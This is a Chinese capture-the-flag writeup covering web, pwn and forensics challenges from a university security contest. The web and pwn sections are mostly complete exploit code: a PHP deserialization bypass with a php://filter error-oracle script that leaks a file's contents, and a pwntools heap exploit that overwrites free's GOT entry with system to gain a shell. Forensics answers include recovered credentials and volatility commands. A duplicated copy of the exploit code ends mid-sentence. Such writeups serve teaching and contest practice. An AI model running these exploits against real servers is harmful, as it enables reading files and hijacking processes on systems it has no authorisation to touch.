# 第七届蓝帽杯全国大学生网络安全技能大赛初赛Writeup

> 原文: https://www.ctfiot.com/132309.html
> ID: 132309

Web

LovePHP

<?php 
class Saferman{
    public $check = True;
    public function __destruct(){
        if($this->check === True){
            file($_GET['secret']);
        }
    }
    public function __wakeup(){
        $this->check=False;
    }
}
if(isset($_GET['my_secret.flag'])){
    unserialize($_GET['my_secret.flag']);
}else{
    highlight_file(__FILE__);
}

特殊字符[, GET或POST方式传参时,变量名中的[会被替换为_,所以反序列化入口传参这里用my[secret.flag这样绕过。

?my[secret.flag=

反序列化后有__wakeup(),会把check变量赋值为false,这里需要绕过__wakeup(),用如下代码绕过

C代表这个类是实现了serializeable接口,实现此接口的类将不再支持 __wakeup(),就绕过去了

C:8:"Saferman":0:{}

最后file函数这里的利用也是在网上找到了原题https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR

file($_GET['secret']);

修改exp传参部分拿到flag,最终exp如下

import requests
import sys
from base64 import b64decode

"""
THE GRAND IDEA:
We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
filter will blow up the string length by 4x every time it is used, which will quickly cause
500 error if and only if the string is non empty. So we now have an oracle that tells us if
the string is empty.

THE GRAND IDEA 2:
The dechunk filter is interesting.
https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
It looks like it was implemented for something http related, but for our purposes, the interesting
behavior is that if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
above oracle! In fact we can verify that since the flag starts with D that the filter chain

dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE

does not cause a 500 error.

THE REST:
So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
into madness trying to figure out ways to:
- somehow get other characters not at the start of the flag file to the front
- detect more precisely which character is at the front
"""

def join(*x):
 return '|'.join(x)

def err(s):
 print(s)
 raise ValueError

def req(s):
 data = {
  'my[secret.flag':'C:8:"Saferman":0:{}',
  'secret': f'php://filter/{s}/resource=/flag'
 }
 return requests.get('http://123.57.73.24:
43180/index.php', params=data).status_code == 500

"""
Step 1:
The second step of our exploit only works under two conditions:
- String only contains a-zA-Z0-9
- String ends with two equals signs

base64-encoding the flag file twice takes care of the first condition.

We don't know the length of the flag file, so we can't be sure that it will end with two equals
signs.

Repeated application of the convert.quoted-printable-encode will only consume additional
memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
If the double-base64 does not end with two equals signs, we will add junk data to the start of the
flag with convert.iconv..CSISO2022KR until it does.
"""

blow_up_enc = join(*['convert.quoted-printable-encode']*1000)
blow_up_utf32 = 'convert.iconv.L1.UCS-4LE'
blow_up_inf = join(*[blow_up_utf32]*50)

header = 'convert.base64-encode|convert.base64-encode'

# Start get baseline blowup
print('Calculating blowup')
baseline_blowup = 0
for n in range(100):
 payload = join(*[blow_up_utf32]*n)
 if req(f'{header}|{payload}'):
  baseline_blowup = n
  break
else:
 err('something wrong')

print(f'baseline blowup is {baseline_blowup}')

trailer = join(*[blow_up_utf32]*(baseline_blowup-1))

assert req(f'{header}|{trailer}') == False

print('detecting equals')
j = [
 req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),
 req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),
 req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')
]
print(j)
if sum(j) != 2:
 err('something wrong')
if j[0] == False:
 header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[1] == False:
 header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'
elif j[2] == False:
 header = f'convert.base64-encode|convert.base64-encode'
else:
 err('something wrong')
print(f'j: {j}')
print(f'header: {header}')

"""
Step two:
Now we have something of the form
[a-zA-Z0-9 things]==

Here the pain begins. For a long time I was trying to find something that would allow me to strip
successive characters from the start of the string to access every character. Maybe something like
that exists but I couldn't find it. However, if you play around with filter combinations you notice
there are filters that *swap* characters:

convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
abcdefgh -> badcfehg

convert.iconv.UCS-4LE.10646-1:
1993, which I call r4, reverses every chunk of four characters:
abcdefgh -> dcbahgfe

This allows us to access the first four characters of the string. Can we do better? It turns out
YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends <0xff><0xfe> to the start of
the string:

abcdefgh -> <0xff><0xfe>abcdefgh

The idea being that if we now use the r4 gadget, we get something like:
ba<0xfe><0xff>fedc

And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
<0xfe><0xff> to get:
bafedc

And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
characters of the string. There's only one problem: our r4 gadget requires that the string length
is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
turns out, if we apply the filter
convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7

It will turn the == into:
+---AD0-3D3D+---AD0-3D3D

And this is magic, because this corrects such that when we apply the
convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!

Let's recap. We have a string like:
abcdefghij==

Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply convert.iconv.CSUNICODE.CSUNICODE:
<0xff><0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply r4 gadget:
ba<0xfe><0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3

Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
bafedcjihg+0DAD3D3+0DAD3Dw==

Then apply r4 once more:
efabijcd0+gh3DAD0+3D3DAD==wD

And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
the string still has two equals signs in it, so we can reapply the technique as many times as we
want, to access all the characters in the string ;)
"""

flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993|convert.base64-decode|convert.base64-encode"
r2 = "convert.iconv.CSUNICODE.UCS-2BE"
r4 = "convert.iconv.UCS-4LE.10646-1:
1993"

def get_nth(n):
 global flip, r2, r4
 o = []
 chunk = n // 2
 if chunk % 2 == 1: o.append(r4)
 o.extend([flip, r4] * (chunk // 2))
 if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
 return join(*o)

"""
Step 3:
This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
I just bruteforced every combination of iconv filters to find these.

Numbers are a bit trickier because iconv doesn't tend to touch them.
In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
want a full leak you can base64 encode a third time and use the first two letters of the resulting
string to figure out which number it is.
"""

rot1 = 'convert.iconv.437.CP930'
be = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
o = ''

def find_letter(prefix):
 if not req(f'{prefix}|dechunk|{blow_up_inf}'):
  # a-f A-F 0-9
  if not req(f'{prefix}|{rot1}|dechunk|{blow_up_inf}'):
   # a-e
   for n in range(5):
    if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'edcba'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
   # A-E
   for n in range(5):
    if req(f'{prefix}|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'EDCBA'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):
   return '*'
  elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # f
   return 'f'
  elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # F
   return 'F'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.rot13|dechunk|{blow_up_inf}'):
  # n-s N-S
  if not req(f'{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}'):
   # n-r
   for n in range(5):
    if req(f'{prefix}|string.rot13|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'rqpon'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
   # N-R
   for n in range(5):
    if req(f'{prefix}|string.rot13|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'RQPON'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # s
   return 's'
  elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # S
   return 'S'
  else:
   err('something wrong')
 elif not req(f'{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # i j k
  if req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'k'
  elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'j'
  elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'i'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # I J K
  if req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'K'
  elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'J'
  elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'I'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # v w x
  if req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'x'
  elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'w'
  elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'v'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # V W X
  if req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'X'
  elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'W'
  elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'V'
  else:
   err('something wrong')
 elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # Z
  return 'Z'
 elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # z
  return 'z'
 elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # M
  return 'M'
 elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # m
  return 'm'
 elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # y
  return 'y'
 elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # Y
  return 'Y'
 elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # l
  return 'l'
 elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # L
  return 'L'
 elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # h
  return 'h'
 elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # H
  return 'H'
 elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # u
  return 'u'
 elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # U
  return 'U'
 elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # g
  return 'g'
 elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # G
  return 'G'
 elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # t
  return 't'
 elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # T
  return 'T'
 else:
  err('something wrong')

print()
for i in range(100):
 prefix = f'{header}|{get_nth(i)}'
 letter = find_letter(prefix)
 # it's a number! check base64
 if letter == '*':
  prefix = f'{header}|{get_nth(i)}|convert.base64-encode'
  s = find_letter(prefix)
  if s == 'M':
   # 0 - 3
   prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
   ss = find_letter(prefix)
   if ss in 'CDEFGH':
    letter = '0'
   elif ss in 'STUVWX':
    letter = '1'
   elif ss in 'ijklmn':
    letter = '2'
   elif ss in 'yz*':
    letter = '3'
   else:
    err(f'bad num ({ss})')
  elif s == 'N':
   # 4 - 7
   prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
   ss = find_letter(prefix)
   if ss in 'CDEFGH':
    letter = '4'
   elif ss in 'STUVWX':
    letter = '5'
   elif ss in 'ijklmn':
    letter = '6'
   elif ss in 'yz*':
    letter = '7'
   else:
    err(f'bad num ({ss})')
  elif s == 'O':
   # 8 - 9
   prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
   ss = find_letter(prefix)
   if ss in 'CDEFGH':
    letter = '8'
   elif ss in 'STUVWX':
    letter = '9'
   else:
    err(f'bad num ({ss})')
  else:
   err('wtf')

 print(end=letter)
 o += letter
 sys.stdout.flush()

"""
We are done!! :)
"""

print()
d = b64decode(o.encode() + b'=' * 4)
# remove KR padding
d = d.replace(b'$)C',b'')
print(b64decode(d))

Pwn

takeway

from pwn import *

context.log_level='debug'
p = remote('101.200.234.115',45528)
elf = ELF('./takeway')
libc = ELF('./libc-so.6')

def add(idx,name,content):
    p.sendlineafter('your choose: ','1')
    p.sendlineafter('your order index',str(idx))
    p.sendafter('your food name: ',name)
    p.sendlineafter('Oops give',content)

def delete(idx):
    p.sendlineafter('your choose: ','2')
    p.sendlineafter('your order index: ',str(idx))

def show(idx):
    p.sendlineafter('your choose: ','3')
    p.sendlineafter('index: ',str(idx))

add(0,'a','aaaaaa')
add(1,'b','bbbbbb')
delete(1)
delete(0)
show(0)
p.recvuntil('order is: ')
heap_addr = u64(p.recvline()[:-1].ljust(8,b'x00')) - 0x10
print('heap_addr',hex(heap_addr))
p.sendafter('name is:',p64(0x2a0+heap_addr))
add(2,'/bin/shx00','aaa')
add(3,p64(elf.got['free']),'aaa')

show(0)
p.recvuntil('rder is: ')
libc_addr = u64(p.recvline()[:-1].ljust(8,b'x00')) - libc.sym['puts']
print('libc_addr',hex(libc_addr))
system = libc_addr + libc.sym['system']
p.sendafter('New food name is:',p64(system))
delete(2)
p.interactive()

p.close()

取证

APK取证

01.【APK取证】涉案apk的包名是？[答题格式:
com.baid.ccs]

com.vestas.app

02.【APK取证】涉案apk的签名序列号是？[答题格式:
0x93829bd]

0x563b45ca

03.【APK取证】涉案apk中DCLOUD_AD_ID的值是？[答题格式:
2354642]

2147483647

04.【APK取证】涉案apk的服务器域名是？[答题格式:
http://sles.vips.com]

https://vip.licai.com

05.【APK取证】涉案apk的主入口是？[答题格式:
com.bai.cc.initactivity]

io.dcloud.PandoraEntry

手机取证

06.【手机取证】该镜像是用的什么模拟器？[答题格式:
天天模拟器]

名字就叫leidian，所以是雷电模拟器

雷电模拟器

07.【手机取证】该镜像中用的聊天软件名称是什么？[答题格式:微信]

与你

08.【手机取证】聊天软件的包名是？[答题格式:
com.baidu.ces]

09.【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]

5万

10.【手机取证】受害人是经过谁介绍认识王哥？[答题格式:董慧]

华哥

计算机取证

11.【计算机取证】请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]

23f861b2e9c5ce9135afc520cbd849677522f54c

12.【计算机取证】给出pc.e01在提取时候的检查员？[答案格式：admin]

暂时未知

13.【计算机取证】请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：http://www.baidu.com]

http://global.bing.com/?scope=web&mkt=en-US&FORM=QBRE

14.【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root/admin]

yang88/3w.qax.com

15.【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]

2023春季更新(14309)

16.【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]

24cfcfdf1fa894244f904067838e7e01e28ff450

17.【计算机取证】请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]

3w.qax.com!!@@

18.【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]

3261

19.【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root/admin]

暂时未知

20.【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]

1019

21.【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]

2023-06-21 01:02:27

22.【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]

volatility.exe -f .memdump.mem --profile=Win7SP1x64 hashdump

3w.qax.com

23.【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]

volatility.exe -f .memdump.mem --profile=Win7SP1x64  printkey -K "ControlSet001EnumUSBSTOR"

2023-06-21 01:01:25

24.【内存取证】请给出用户yang88的LMHASH值？[答案格式：字母小写]

见上上图

aad3b435b51404eeaad3b435b51404ee

更多详情看https://daiker.gitbook.io/windows-protocol/ntlm-pian/4

25.【内存取证】请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]

2023-06-21 00:29:16

26.【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]

volatility.exe -f .memdump.mem --profile=Win7SP1x64 userassist

2023-06-21 00:47:41

27.【内存取证】分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]

通过 chrome浏览历史发现

SELECT url,title,visit_count,datetime((last_visit_time / 1000000) + strftime('%s', '1601-01-01'), 'unixepoch', 'localtime') AS visit_datetime FROM urls;

2

28.【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]

volatility.exe -f .memdump.mem --profile=Win7SP1x64 cmdline

取最大的

2456

服务器取证

29.【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]

3.10.0-957.el7.x86_64

30.【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]

netstat -tlunp # 发现8083端口

Laravel框架，查看.env文件

cat /www/wwwroot/v9.licai.com/.env

ff1d923939ca2dcf

31.【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]

同上

pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com

32.【服务器取证】请给出涉网网站数据库版本号? [答题格式: 5.6.00]

查看日志发现版本

5.7.40

33.【服务器取证】请给出嫌疑人累计推广人数？[答案格式：100]

题目给了.xb的数据库数据文件，获取解压数据参考文章https://www.cnblogs.com/tongcharge/p/11600594.html

之后连接数据库，获取后台密码密文（直接修改源代码绕过校验也可以）

Laravel解密方法参考 https://blog.csdn.net/Ferre666/article/details/75094522

下面介绍的是解密密文的方式

vim /www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/LoginController.php

 public function index(Request $request)
    {
        // echo Crypt::
encrypt('123456');
        // echo Crypt::
decrypt("eyJpdiI6IjVJK3U1bERBSnhqdUZTcDNyVHBFREE9PSIsInZhbHVlIjoiSWpMdGtOQTlkVTFlVU83aHR3RFJ3UlU2K09lRjBuSzdSSlwvY0FLTTBXY009IiwibWFjIjoiZGY4MWNkYWY3Njc2ODRmODg0YjMxMWM1NmViNDAxZjA4ZDI0YTUwNGZhZmFjNjk0ZDZkMzQzZDA2NGI5ZDdmMSJ9");
        echo Crypt::
decrypt("eyJpdiI6IjNHMDJWZkpwMnBXVUpsYjRKcEM4WlE9PSIsInZhbHVlIjoibEpXSkJZZFlpWkl2dU9kY2tvR2xMWnZxT3E5T1pRUnhDVFlidjczY01EMD0iLCJtYWMiOiI5ODA2Nzc5MjM0MDE4MGY0MTkxMGEyOGQ1MTUwNWZiYmViMzk0MmQxYzc3NmViOWE5YTZjMjljNWM5OGIxZWVkIn0=");
        ......

解得
admin/root123456
root/mzx10000s

访问http://vip.licai.com:
8083/AdminV9YY/Login。后台地址可以通过/www/wwwlogs/v9.licai.com.log日志查看

登录后台后,会员管理->会员管理。案件介绍中嫌疑人为杨某，直接搜索名字杨。发现只有杨德忠具有推广人数

69

34.【服务器取证】请给出涉案网站后台启用的超级管理员?[答题格式:
abc]

管理账号->

admin

35.【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]

暂时未知

36.【服务器取证】最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]

183.160.76.194

37.【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:
100]

会员管理->团队结算，会员等级筛选得到20个

20

38.【服务器取证】分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]

数据库中搜索上海，然后在会员管理通过用户名分别查询两个用户得余额发现都大于0

2

39.【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:
10000.00]

128457.00

40.【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:
123]

受害人上线 为 杨德忠。下线在代码中通过tuiguangrens字段表示的，在会员管理->团队结算中

vim /www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/SalesmansController.php

但是由于默认前台返回的推广下线数是

我们修改模板中xxtuiguangrens为tuiguangrens

vim /www/wwwroot/v9.licai.com/resources/views/hui/salesmans/lists.blade.php

17

41.【服务器取证】分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]

rows = document.querySelectorAll("#view tr");
var count = 0;

rows.forEach(function(row) {
    var tds  = row.getElementsByTagName('td');
    var tuiguangrens = parseInt(tds[5].innerHTML);

    if (tuiguangrens > 2) {
        //console.log(tuiguangrens);
     count++;
    }
 });
console.log("Count: " + count);

60

42.【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]

rows = document.querySelectorAll("#view tr");
var count = 0;
var Name = "";
maxValue  = 0;

rows.forEach(function(row) {
    var tds  = row.getElementsByTagName('td');
    var tuiguangrens = parseInt(tds[5].innerHTML);

    if (tuiguangrens > maxValue) {
                maxValue = tuiguangrens;
                Name = tds[4].innerHTML;
     }
 });
console.log("最多代理人姓名: " + Name);

骆潇原

43.【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]

select (SELECT sum(moneylog_money)
FROM `viplicai`.`moneylog` WHERE `viplicai`.`moneylog`.`moneylog_status`='+')-(SELECT sum(moneylog_money)
FROM `viplicai`.`moneylog` WHERE `viplicai`.`moneylog`.`moneylog_status`='-');

15,078,796.38


```
<?php 
class Saferman{
    public $check = True;
    public function __destruct(){
        if($this->check === True){
            file($_GET['secret']);
        }
    }
    public function __wakeup(){
        $this->check=False;
    }
}
if(isset($_GET['my_secret.flag'])){
    unserialize($_GET['my_secret.flag']);
}else{
    highlight_file(__FILE__);
}
?my[secret.flag=
C:8:"Saferman":0:{}
file($_GET['secret']);
import requests
import sys
from base64 import b64decode

"""
THE GRAND IDEA:
We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
filter will blow up the string length by 4x every time it is used, which will quickly cause
500 error if and only if the string is non empty. So we now have an oracle that tells us if
the string is empty.

THE GRAND IDEA 2:
The dechunk filter is interesting.
https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
It looks like it was implemented for something http related, but for our purposes, the interesting
behavior is that if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
above oracle! In fact we can verify that since the flag starts with D that the filter chain

dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE

does not cause a 500 error.

THE REST:
So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
into madness trying to figure out ways to:
- somehow get other characters not at the start of the flag file to the front
- detect more precisely which character is at the front
"""

def join(*x):
 return '|'.join(x)

def err(s):
 print(s)
 raise ValueError

def req(s):
 data = {
  'my[secret.flag':'C:8:"Saferman":0:{}',
  'secret': f'php://filter/{s}/resource=/flag'
 }
 return requests.get('http://123.57.73.24:
43180/index.php', params=data).status_code == 500

"""
Step 1:
The second step of our exploit only works under two conditions:
- String only contains a-zA-Z0-9
- String ends with two equals signs

base64-encoding the flag file twice takes care of the first condition.

We don't know the length of the flag file, so we can't be sure that it will end with two equals
signs.

Repeated application of the convert.quoted-printable-encode will only consume additional
memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
If the double-base64 does not end with two equals signs, we will add junk data to the start of the
flag with convert.iconv..CSISO2022KR until it does.
"""

blow_up_enc = join(*['convert.quoted-printable-encode']*1000)
blow_up_utf32 = 'convert.iconv.L1.UCS-4LE'
blow_up_inf = join(*[blow_up_utf32]*50)

header = 'convert.base64-encode|convert.base64-encode'

# Start get baseline blowup
print('Calculating blowup')
baseline_blowup = 0
for n in range(100):
 payload = join(*[blow_up_utf32]*n)
 if req(f'{header}|{payload}'):
  baseline_blowup = n
  break
else:
 err('something wrong')

print(f'baseline blowup is {baseline_blowup}')

trailer = join(*[blow_up_utf32]*(baseline_blowup-1))

assert req(f'{header}|{trailer}') == False

print('detecting equals')
j = [
 req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),
 req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),
 req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')
]
print(j)
if sum(j) != 2:
 err('something wrong')
if j[0] == False:
 header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[1] == False:
 header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'
elif j[2] == False:
 header = f'convert.base64-encode|convert.base64-encode'
else:
 err('something wrong')
print(f'j: {j}')
print(f'header: {header}')

"""
Step two:
Now we have something of the form
[a-zA-Z0-9 things]==

Here the pain begins. For a long time I was trying to find something that would allow me to strip
successive characters from the start of the string to access every character. Maybe something like
that exists but I couldn't find it. However, if you play around with filter combinations you notice
there are filters that *swap* characters:

convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
abcdefgh -> badcfehg

convert.iconv.UCS-4LE.10646-1:
1993, which I call r4, reverses every chunk of four characters:
abcdefgh -> dcbahgfe

This allows us to access the first four characters of the string. Can we do better? It turns out
YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends <0xff><0xfe> to the start of
the string:

abcdefgh -> <0xff><0xfe>abcdefgh

The idea being that if we now use the r4 gadget, we get something like:
ba<0xfe><0xff>fedc

And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
<0xfe><0xff> to get:
bafedc

And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
